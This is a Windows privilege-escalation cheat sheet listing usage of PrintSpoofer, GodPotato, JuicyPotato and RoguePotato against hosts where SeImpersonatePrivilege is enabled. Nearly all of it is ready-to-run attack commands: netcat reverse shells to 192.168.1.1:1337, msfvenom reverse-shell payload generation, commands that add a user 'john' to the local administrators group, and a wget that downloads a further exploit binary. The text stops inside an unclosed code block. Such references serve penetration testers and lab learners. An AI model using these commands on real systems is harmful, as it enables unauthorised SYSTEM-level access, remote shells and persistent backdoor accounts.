# Windows Privilege Escalation Cheatsheet

## PrintSpoofer Exploit

**Reference:** [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

### Required Privileges

```
SeChangeNotifyPrivilege = Enabled
SeImpersonatePrivilege  = Enabled
```

### Usage

```powershell
PS> .\PrintSpoofer64.exe -i -c cmd.exe
PS> .\PrintSpoofer64.exe -i -c powershell.exe
PS> .\PrintSpoofer64.exe -c "C:\Temp\nc.exe 192.168.1.1 1337 -e cmd"
PS> .\PrintSpoofer64.exe -c "C:\Temp\nc.exe 192.168.1.1 1337 -e powershell"
```

---

## GodPotato Exploit

**Reference:** [GodPotato](https://github.com/BeichenDream/GodPotato)

### Required Privileges

```
SeImpersonatePrivilege  = Enabled
```

### Usage

```powershell
PS> .\GodPotato-NET4.exe -cmd "cmd /c whoami"
PS> .\GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.1.1 1337"
PS> .\GodPotato-NET4.exe -cmd "shell.exe" (with msfvenom)
```

### Add a New User to the Administrator Group

```powershell
PS> .\GodPotato-NET4.exe -cmd "cmd /c net user john pass123! /add"
PS> .\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators john /add"
```

---

## JuicyPotato Exploit

**Reference:** [JuicyPotato](https://github.com/ohpe/juicy-potato)

### Required Privileges

```
SeImpersonatePrivilege  = Enabled
```

### Create a Payload with Msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=1337 -f exe -o payload.exe
```

### Run with JuicyPotato

```powershell
PS> .\JuicyPotato.exe -t * -p payload.exe -l 1337
PS> .\JuicyPotato.exe -t * -p "payload.exe" -a
```

---

## RoguePotato Exploit

**Reference:** [RoguePotato](https://github.com/antonioCoco/RoguePotato)

### Create a Payload with Msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=1337 -f exe -o payload.exe
```

### Run with RoguePotato

```powershell
PS> .\RoguePotato.exe -r 192.168.1.1 -e "payload.exe" -l 1337
```

### If `SeManageVolumePrivilege` is Disabled

Download and use the following tool:

```bash
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
